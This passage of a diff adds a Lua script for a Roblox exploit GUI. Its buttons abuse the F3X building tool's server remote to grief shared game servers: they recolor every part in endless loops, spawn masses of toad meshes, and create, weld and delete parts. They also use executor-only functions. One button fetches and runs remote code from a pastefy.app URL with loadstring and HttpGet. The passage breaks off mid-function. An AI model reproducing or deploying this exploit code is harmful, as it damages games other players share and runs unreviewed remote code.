+-- TextButton "TextButton"
+HTT03["TextButton_29"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_29"].Name = "TextButton"
+HTT03["TextButton_29"].Visible = true
+HTT03["TextButton_29"].ZIndex = 1
+HTT03["TextButton_29"].LayoutOrder = 0
+HTT03["TextButton_29"].Position = UDim2.new(0.000000,191,0.000000,104)
+HTT03["TextButton_29"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_29"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_29"].Rotation = 0
+HTT03["TextButton_29"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_29"].BackgroundTransparency = 0
+HTT03["TextButton_29"].BorderSizePixel = 3
+HTT03["TextButton_29"].BorderColor3 = Color3.fromRGB(5,0,255)
+HTT03["TextButton_29"].ClipsDescendants = false
+HTT03["TextButton_29"].Active = true
+HTT03["TextButton_29"].Selectable = true
+HTT03["TextButton_29"].AutoButtonColor = true
+HTT03["TextButton_29"].Modal = false
+HTT03["TextButton_29"].Text = "auto neon"
+HTT03["TextButton_29"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_29"].TextSize = 10
+HTT03["TextButton_29"].TextTransparency = 0
+HTT03["TextButton_29"].TextScaled = false
+HTT03["TextButton_29"].TextWrapped = false
+HTT03["TextButton_29"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_29"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_29"].Font = Enum.Font.Legacy
+HTT03["TextButton_29"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_29"].TextStrokeTransparency = 1
+HTT03["TextButton_29"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_30"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_29"])
+HTT03["UIAspectRatioConstraint_30"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_31"] = Instance.new("LocalScript")
+HTT03["LocalScript_31"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_31"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMaterial(part,material)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = material
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local colorbyelv4 = {
+			Color3.fromRGB(255,0,0),
+			Color3.fromRGB(255,128,0),
+			Color3.fromRGB(255,255,0),
+			Color3.fromRGB(0,255,0),
+			Color3.fromRGB(0,255,255),
+			Color3.fromRGB(0,128,255),
+			Color3.fromRGB(170,0,255),
+			Color3.fromRGB(255,0,170)
+		}
+	
+		local parts = workspace:GetDescendants()
+	
+		for _,v in ipairs(parts) do
+			if v:IsA("BasePart") then
+				if string.find(v.Name:lower(),"kys") then
+					print("ok")
+				else
+					task.defer(function()
+						SetMaterial(v,Enum.Material.Neon)
+						while true do
+							Color(v,colorbyelv4[math.random(1,#colorbyelv4)])
+							task.wait()
+						end
+					end)
+				end
+			end
+		end
+end)]==]
+    end)
+    HTT03["LocalScript_31"].Parent = HTT03["TextButton_29"]
+    if HTT03["LocalScript_31"]:IsA("BaseScript") then HTT03["LocalScript_31"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMaterial(part,material)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = material
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local colorbyelv4 = {
+			Color3.fromRGB(255,0,0),
+			Color3.fromRGB(255,128,0),
+			Color3.fromRGB(255,255,0),
+			Color3.fromRGB(0,255,0),
+			Color3.fromRGB(0,255,255),
+			Color3.fromRGB(0,128,255),
+			Color3.fromRGB(170,0,255),
+			Color3.fromRGB(255,0,170)
+		}
+	
+		local parts = workspace:GetDescendants()
+	
+		for _,v in ipairs(parts) do
+			if v:IsA("BasePart") then
+				if string.find(v.Name:lower(),"kys") then
+					print("ok")
+				else
+					task.defer(function()
+						SetMaterial(v,Enum.Material.Neon)
+						while true do
+							Color(v,colorbyelv4[math.random(1,#colorbyelv4)])
+							task.wait()
+						end
+					end)
+				end
+			end
+		end
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMaterial(part,material)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = material
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local colorbyelv4 = {
+			Color3.fromRGB(255,0,0),
+			Color3.fromRGB(255,128,0),
+			Color3.fromRGB(255,255,0),
+			Color3.fromRGB(0,255,0),
+			Color3.fromRGB(0,255,255),
+			Color3.fromRGB(0,128,255),
+			Color3.fromRGB(170,0,255),
+			Color3.fromRGB(255,0,170)
+		}
+	
+		local parts = workspace:GetDescendants()
+	
+		for _,v in ipairs(parts) do
+			if v:IsA("BasePart") then
+				if string.find(v.Name:lower(),"kys") then
+					print("ok")
+				else
+					task.defer(function()
+						SetMaterial(v,Enum.Material.Neon)
+						while true do
+							Color(v,colorbyelv4[math.random(1,#colorbyelv4)])
+							task.wait()
+						end
+					end)
+				end
+			end
+		end
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_31"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_32"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_32"].Name = "TextButton"
+HTT03["TextButton_32"].Visible = true
+HTT03["TextButton_32"].ZIndex = 1
+HTT03["TextButton_32"].LayoutOrder = 0
+HTT03["TextButton_32"].Position = UDim2.new(0.000000,364,0.000000,102)
+HTT03["TextButton_32"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_32"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_32"].Rotation = 0
+HTT03["TextButton_32"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_32"].BackgroundTransparency = 0
+HTT03["TextButton_32"].BorderSizePixel = 3
+HTT03["TextButton_32"].BorderColor3 = Color3.fromRGB(35,0,255)
+HTT03["TextButton_32"].ClipsDescendants = false
+HTT03["TextButton_32"].Active = true
+HTT03["TextButton_32"].Selectable = true
+HTT03["TextButton_32"].AutoButtonColor = true
+HTT03["TextButton_32"].Modal = false
+HTT03["TextButton_32"].Text = "rain toad"
+HTT03["TextButton_32"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_32"].TextSize = 10
+HTT03["TextButton_32"].TextTransparency = 0
+HTT03["TextButton_32"].TextScaled = false
+HTT03["TextButton_32"].TextWrapped = false
+HTT03["TextButton_32"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_32"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_32"].Font = Enum.Font.Legacy
+HTT03["TextButton_32"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_32"].TextStrokeTransparency = 1
+HTT03["TextButton_32"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_33"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_32"])
+HTT03["UIAspectRatioConstraint_33"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_34"] = Instance.new("LocalScript")
+HTT03["LocalScript_34"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_34"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/6IDEDglp/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_34"].Parent = HTT03["TextButton_32"]
+    if HTT03["LocalScript_34"]:IsA("BaseScript") then HTT03["LocalScript_34"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/6IDEDglp/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/6IDEDglp/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_34"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_35"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_35"].Name = "TextButton"
+HTT03["TextButton_35"].Visible = true
+HTT03["TextButton_35"].ZIndex = 1
+HTT03["TextButton_35"].LayoutOrder = 0
+HTT03["TextButton_35"].Position = UDim2.new(0.000000,21,0.000000,191)
+HTT03["TextButton_35"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_35"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_35"].Rotation = 0
+HTT03["TextButton_35"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_35"].BackgroundTransparency = 0
+HTT03["TextButton_35"].BorderSizePixel = 3
+HTT03["TextButton_35"].BorderColor3 = Color3.fromRGB(17,0,255)
+HTT03["TextButton_35"].ClipsDescendants = false
+HTT03["TextButton_35"].Active = true
+HTT03["TextButton_35"].Selectable = true
+HTT03["TextButton_35"].AutoButtonColor = true
+HTT03["TextButton_35"].Modal = false
+HTT03["TextButton_35"].Text = "taco rain"
+HTT03["TextButton_35"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_35"].TextSize = 10
+HTT03["TextButton_35"].TextTransparency = 0
+HTT03["TextButton_35"].TextScaled = false
+HTT03["TextButton_35"].TextWrapped = false
+HTT03["TextButton_35"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_35"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_35"].Font = Enum.Font.Legacy
+HTT03["TextButton_35"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_35"].TextStrokeTransparency = 1
+HTT03["TextButton_35"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_36"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_35"])
+HTT03["UIAspectRatioConstraint_36"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_37"] = Instance.new("LocalScript")
+HTT03["LocalScript_37"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_37"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	ReplicatedStorage = game:GetService("ReplicatedStorage")
+		Players = game:GetService("Players")
+		player = Players.LocalPlayer
+		char = player.Character or player.CharacterAdded:Wait()
+		backpack = player:WaitForChild("Backpack")
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+		end
+	
+		local f3x = getf3x()
+		if not f3x then warn("No F3X found") return end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function fastInvoke(args)
+			task.spawn(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
+			task.spawn(function()
+				local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
+				if not p then return end
+	
+				fastInvoke({"SyncResize",   {{Part = p, CFrame = cf, Size = size}}})
+				if mat  then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
+				if col  then fastInvoke({"SyncColor",    {{Part = p, Color = col, UnionColoring = false}}}) end
+				if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
+	
+				if mid or mtex or mscale then
+					fastInvoke({"CreateMeshes", {{Part = p}}})
+					if mid  then fastInvoke({"SyncMesh", {{Part = p, MeshId   = "rbxassetid://" .. mid}}}) end
+					if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
+					if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
+				end
+	
+				if extra then extra(p) end
+			end)
+		end
+	
+		math.randomseed(tick())
+	
+		local TOAD_MESH   = "14846869"
+		local TOAD_TEX    = "14846834"
+		local TOAD_SCALE  = Vector3.new(15, 15, 15)
+		local TOAD_SIZE   = Vector3.new(50, 50, 30)
+	
+		local function rainToads()
+			while true do
+				task.wait(0.01)
+	
+				local c = player.Character
+				local hum = c and c:FindFirstChildOfClass("Humanoid")
+				local hrp = c and c:FindFirstChild("HumanoidRootPart")
+	
+				if not (hum and hrp and hum.Health > 0) then
+					task.wait(1)
+					continue
+				end
+	
+				local basePos = hrp.Position
+	
+				local rx = math.random(-600, 600)
+				local rz = math.random(-600, 600)
+				local x = math.floor(basePos.X + rx)
+				local z = math.floor(basePos.Z + rz)
+				local y = basePos.Y + math.random(400, 800)
+	
+				local randomRotation = CFrame.Angles(
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180))
+				)
+	
+				local cf = CFrame.new(x, y, z) * randomRotation
+	
+				quickPart(
+					"Normal",
+					cf,
+					TOAD_SIZE,
+					Enum.Material.Plastic,
+					Color3.new(1,1,1),
+					0,
+					TOAD_MESH,
+					TOAD_TEX,
+					TOAD_SCALE,
+					function(p)
+						fastInvoke({"SyncAnchor",    {{Part = p, Anchored = false}}})
+						fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
+	
+						fastInvoke({"SetName", {{Part = p}}, "taco"})
+	
+						local s = Instance.new("Sound", p)
+						s.SoundId = "rbxassetid://153752123"
+						s.Volume = 0
+						s.PlayOnRemove = true
+						s:Destroy()
+					end
+				)
+			end
+		end
+	
+		coroutine.wrap(rainToads)()
+end)]==]
+    end)
+    HTT03["LocalScript_37"].Parent = HTT03["TextButton_35"]
+    if HTT03["LocalScript_37"]:IsA("BaseScript") then HTT03["LocalScript_37"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	ReplicatedStorage = game:GetService("ReplicatedStorage")
+		Players = game:GetService("Players")
+		player = Players.LocalPlayer
+		char = player.Character or player.CharacterAdded:Wait()
+		backpack = player:WaitForChild("Backpack")
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+		end
+	
+		local f3x = getf3x()
+		if not f3x then warn("No F3X found") return end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function fastInvoke(args)
+			task.spawn(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
+			task.spawn(function()
+				local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
+				if not p then return end
+	
+				fastInvoke({"SyncResize",   {{Part = p, CFrame = cf, Size = size}}})
+				if mat  then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
+				if col  then fastInvoke({"SyncColor",    {{Part = p, Color = col, UnionColoring = false}}}) end
+				if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
+	
+				if mid or mtex or mscale then
+					fastInvoke({"CreateMeshes", {{Part = p}}})
+					if mid  then fastInvoke({"SyncMesh", {{Part = p, MeshId   = "rbxassetid://" .. mid}}}) end
+					if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
+					if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
+				end
+	
+				if extra then extra(p) end
+			end)
+		end
+	
+		math.randomseed(tick())
+	
+		local TOAD_MESH   = "14846869"
+		local TOAD_TEX    = "14846834"
+		local TOAD_SCALE  = Vector3.new(15, 15, 15)
+		local TOAD_SIZE   = Vector3.new(50, 50, 30)
+	
+		local function rainToads()
+			while true do
+				task.wait(0.01)
+	
+				local c = player.Character
+				local hum = c and c:FindFirstChildOfClass("Humanoid")
+				local hrp = c and c:FindFirstChild("HumanoidRootPart")
+	
+				if not (hum and hrp and hum.Health > 0) then
+					task.wait(1)
+					continue
+				end
+	
+				local basePos = hrp.Position
+	
+				local rx = math.random(-600, 600)
+				local rz = math.random(-600, 600)
+				local x = math.floor(basePos.X + rx)
+				local z = math.floor(basePos.Z + rz)
+				local y = basePos.Y + math.random(400, 800)
+	
+				local randomRotation = CFrame.Angles(
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180))
+				)
+	
+				local cf = CFrame.new(x, y, z) * randomRotation
+	
+				quickPart(
+					"Normal",
+					cf,
+					TOAD_SIZE,
+					Enum.Material.Plastic,
+					Color3.new(1,1,1),
+					0,
+					TOAD_MESH,
+					TOAD_TEX,
+					TOAD_SCALE,
+					function(p)
+						fastInvoke({"SyncAnchor",    {{Part = p, Anchored = false}}})
+						fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
+	
+						fastInvoke({"SetName", {{Part = p}}, "taco"})
+	
+						local s = Instance.new("Sound", p)
+						s.SoundId = "rbxassetid://153752123"
+						s.Volume = 0
+						s.PlayOnRemove = true
+						s:Destroy()
+					end
+				)
+			end
+		end
+	
+		coroutine.wrap(rainToads)()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+	ReplicatedStorage = game:GetService("ReplicatedStorage")
+		Players = game:GetService("Players")
+		player = Players.LocalPlayer
+		char = player.Character or player.CharacterAdded:Wait()
+		backpack = player:WaitForChild("Backpack")
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+		end
+	
+		local f3x = getf3x()
+		if not f3x then warn("No F3X found") return end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function fastInvoke(args)
+			task.spawn(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
+			task.spawn(function()
+				local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
+				if not p then return end
+	
+				fastInvoke({"SyncResize",   {{Part = p, CFrame = cf, Size = size}}})
+				if mat  then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
+				if col  then fastInvoke({"SyncColor",    {{Part = p, Color = col, UnionColoring = false}}}) end
+				if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
+	
+				if mid or mtex or mscale then
+					fastInvoke({"CreateMeshes", {{Part = p}}})
+					if mid  then fastInvoke({"SyncMesh", {{Part = p, MeshId   = "rbxassetid://" .. mid}}}) end
+					if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
+					if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
+				end
+	
+				if extra then extra(p) end
+			end)
+		end
+	
+		math.randomseed(tick())
+	
+		local TOAD_MESH   = "14846869"
+		local TOAD_TEX    = "14846834"
+		local TOAD_SCALE  = Vector3.new(15, 15, 15)
+		local TOAD_SIZE   = Vector3.new(50, 50, 30)
+	
+		local function rainToads()
+			while true do
+				task.wait(0.01)
+	
+				local c = player.Character
+				local hum = c and c:FindFirstChildOfClass("Humanoid")
+				local hrp = c and c:FindFirstChild("HumanoidRootPart")
+	
+				if not (hum and hrp and hum.Health > 0) then
+					task.wait(1)
+					continue
+				end
+	
+				local basePos = hrp.Position
+	
+				local rx = math.random(-600, 600)
+				local rz = math.random(-600, 600)
+				local x = math.floor(basePos.X + rx)
+				local z = math.floor(basePos.Z + rz)
+				local y = basePos.Y + math.random(400, 800)
+	
+				local randomRotation = CFrame.Angles(
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180)),
+					math.rad(math.random(-180, 180))
+				)
+	
+				local cf = CFrame.new(x, y, z) * randomRotation
+	
+				quickPart(
+					"Normal",
+					cf,
+					TOAD_SIZE,
+					Enum.Material.Plastic,
+					Color3.new(1,1,1),
+					0,
+					TOAD_MESH,
+					TOAD_TEX,
+					TOAD_SCALE,
+					function(p)
+						fastInvoke({"SyncAnchor",    {{Part = p, Anchored = false}}})
+						fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
+	
+						fastInvoke({"SetName", {{Part = p}}, "taco"})
+	
+						local s = Instance.new("Sound", p)
+						s.SoundId = "rbxassetid://153752123"
+						s.Volume = 0
+						s.PlayOnRemove = true
+						s:Destroy()
+					end
+				)
+			end
+		end
+	
+		coroutine.wrap(rainToads)()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_37"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_38"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_38"].Name = "TextButton"
+HTT03["TextButton_38"].Visible = true
+HTT03["TextButton_38"].ZIndex = 1
+HTT03["TextButton_38"].LayoutOrder = 0
+HTT03["TextButton_38"].Position = UDim2.new(0.000000,190,0.000000,191)
+HTT03["TextButton_38"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_38"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_38"].Rotation = 0
+HTT03["TextButton_38"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_38"].BackgroundTransparency = 0
+HTT03["TextButton_38"].BorderSizePixel = 3
+HTT03["TextButton_38"].BorderColor3 = Color3.fromRGB(0,17,255)
+HTT03["TextButton_38"].ClipsDescendants = false
+HTT03["TextButton_38"].Active = true
+HTT03["TextButton_38"].Selectable = true
+HTT03["TextButton_38"].AutoButtonColor = true
+HTT03["TextButton_38"].Modal = false
+HTT03["TextButton_38"].Text = "disco"
+HTT03["TextButton_38"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_38"].TextSize = 10
+HTT03["TextButton_38"].TextTransparency = 0
+HTT03["TextButton_38"].TextScaled = false
+HTT03["TextButton_38"].TextWrapped = false
+HTT03["TextButton_38"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_38"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_38"].Font = Enum.Font.Legacy
+HTT03["TextButton_38"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_38"].TextStrokeTransparency = 1
+HTT03["TextButton_38"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_39"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_38"])
+HTT03["UIAspectRatioConstraint_39"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_40"] = Instance.new("LocalScript")
+HTT03["LocalScript_40"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_40"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+				local Players = game:GetService("Players")
+				local player = Players.LocalPlayer
+				local char = player.Character or player.CharacterAdded:Wait()
+				local hrp = char:WaitForChild("HumanoidRootPart")
+	
+				local tool
+				for i,v in player:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				for i,v in game.ReplicatedStorage:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				remote = tool.SyncAPI.ServerEndpoint
+	
+				local function ohno(args)
+					task.defer(function()
+						pcall(function()
+							remote:InvokeServer(unpack(args))
+						end)
+					end)
+				end
+	
+				function SetCollision(part,boolean)
+					local args = {
+						[1] = "SyncCollision",
+						[2] = {
+							[1] = {
+								Part = part,
+								CanCollide = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetAnchor(boolean,part)
+					local args = {
+						[1] = "SyncAnchor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Anchored = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreatePart(cf,parent)
+					local args = {
+						[1] = "CreatePart",
+						[2] = "Normal",
+						[3] = cf,
+						[4] = parent
+					}
+					ohno(args)
+				end
+	
+				function DestroyPart(part)
+					local args = {
+						[1] = "Remove",
+						[2] = {
+							[1] = part
+						}
+					}
+					ohno(args)
+				end
+	
+				function MovePart(part,cf)
+					local args = {
+						[1] = "SyncMove",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Resize(part,size,cf)
+					local args = {
+						[1] = "SyncResize",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf,
+								Size = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddMesh(part)
+					local args = {
+						[1] = "CreateMeshes",
+						[2] = {
+							[1] = {
+								Part = part
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetMesh(part,meshid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								MeshId = "rbxassetid://"..meshid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetTexture(part,texid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								TextureId = "rbxassetid://"..texid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetName(part,stringg)
+					local args = {
+						[1] = "SetName",
+						[2] = {
+							[1] = part
+						},
+						[3] = stringg
+					}
+					ohno(args)
+				end
+	
+				function MakeMeshNeon(part)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								VertexColor = vector.create(3,3,3)
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function MeshResize(part,size)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								Scale = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Weld(part1,part2,lead)
+					local args = {
+						[1] = "CreateWelds",
+						[2] = {
+							[1] = part1,
+							[2] = part2
+						},
+						[3] = lead
+					}
+					ohno(args)
+				end
+	
+				function SetLocked(part,boolean)
+					local args = {
+						[1] = "SetLocked",
+						[2] = {
+							[1] = part
+						},
+						[3] = boolean
+					}
+					ohno(args)
+				end
+	
+				function SetTrans(part,int)
+					local args = {
+						[1] = "SyncMaterial",
+						[2] = {
+							[1] = {
+								Part = part,
+								Transparency = int
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreateSpotlight(part)
+					local args = {
+						[1] = "CreateLights",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SyncLighting(part,brightness)
+					local args = {
+						[1] = "SyncLighting",
